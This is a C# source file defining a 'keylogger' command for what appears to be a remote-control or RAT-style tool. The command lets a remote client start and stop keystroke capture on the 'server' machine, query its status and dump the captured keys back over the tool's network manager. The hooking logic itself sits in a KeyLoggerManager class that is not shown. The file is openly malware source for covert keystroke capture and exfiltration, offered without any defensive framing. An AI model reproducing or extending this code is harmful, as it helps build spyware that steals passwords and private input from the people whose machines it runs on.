using KeyLogger;
using NetworkManager;
using System;
using System.Collections.Generic;

namespace Commands
{
    internal class KeyLogger : ICommand
    {
        public string name { get; } = "keylogger";

        public string description { get; } = "Capture the server's keystokes. You can see it's status, dump logged keys, start and stop it";

        public string syntaxHelper { get; } = "keylogger [start|stop|dump|status]";

        public bool isLocal { get; } = false;

        public List<List<Type>> validArguments { get; } = new List<List<Type>>()
        {
            new List<Type>(){typeof(string)}
        };


        KeyLoggerManager keyLoggerManager { get; set; }

        public void GetKeyLoggerManagerInstance(KeyLoggerManager manager) => keyLoggerManager = manager;


        public bool PreProcessCommand(List<string> args)
        {
            throw new NotImplementedException();
        }

        public void ClientMethod(List<string> args)
        {
            if (args.Count != 1)
            {
                return;
            }

            if (args[0] == "status" || args[0] == "dump")
            {
                Console.WriteLine(GlobalNetworkManager.ReadLine());
            }
        }

        public void ServerMethod(List<string> args)
        {
            switch (args[0])
            {
                case "start":
                    StartKeylogger();
                    break;
                case "stop":
                    StopKeylogger();
                    break;
                case "status":
                    SendKeyloggerStatusToClient();
                    break;
                case "dump":
                    SendKeyLogsToClient();
                    break;
            }
        }

        void StartKeylogger() => keyLoggerManager.StartListening();

        void StopKeylogger() => keyLoggerManager.StopListening();

        void SendKeyloggerStatusToClient() =>
            GlobalNetworkManager.WriteLine(keyLoggerManager.GetStatus() ? "The keylogger is running" : "The keylogger isn't started");

        void SendKeyLogsToClient() =>
            GlobalNetworkManager.WriteLine(keyLoggerManager.DumpLogs());
    }
}
